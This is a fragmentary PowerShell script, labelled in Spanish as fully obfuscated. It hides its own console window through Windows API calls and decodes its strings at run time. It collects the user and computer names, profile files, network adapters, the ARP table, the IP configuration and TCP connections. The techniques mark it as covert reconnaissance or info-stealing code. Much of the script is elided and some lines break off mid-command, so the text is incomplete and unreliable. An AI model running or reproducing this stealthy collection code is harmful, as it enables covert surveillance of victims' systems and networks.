# ============================================================
# OFUSCACION COMPLETA: VALORES + NOMBRES DE VARIABLES
# ============================================================
...
public class a {
    [DllImport("kernel32.dll")] static public extern IntPtr b();
    [DllImport("user32.dll")] static public extern bool c(IntPtr d, int e);
    const int f = 0;
    public static void g() { c(b(), f); }
}
"@
    [a]::g()
}
...
$z5 = x $h5    # 
$z6 = x $h6    # 
$z7 = Join-Path $env:LOCALAPPDATA (x $h7)    # Temp
$z8 = $env:USERNAME
$z9 = $env:COMPUTERNAME
...
Get-ChildItem (Join-Path $env:USERPROFILE (x $h9)) -Filter "$(x $h8)*" -ErrorAction SilentlyContinue | 
...
"@
    ...
    $f6 = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq "Up" } | 
        Select-Object Name, InterfaceDescription, MacAddress, LinkSpeed
    $f5 += "`n`n=== ADAPTADORES ===`n"
    $f5 += ($f6 | Format-List | Out-String)

    $f7 = Get-NetNeighbor -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.State -eq "Reachable" } |
        Select-Object IPAddress, LinkLayerAddress, InterfaceAlias
    $f5 += "`n`n=== TABLA ARP ===`n"
    $f5 += ($f7 | Format-Table -AutoSize | Out-String)

    $f8 = Get-NetIPConfiguration -ErrorAction SilentlyContinue | Where-Object { $_.NetAdapter.Status -eq "Up" } |
...
"@
    ...
    $f11 = Get-NetTCPConnection -ErrorAction SilentlyContinue | 
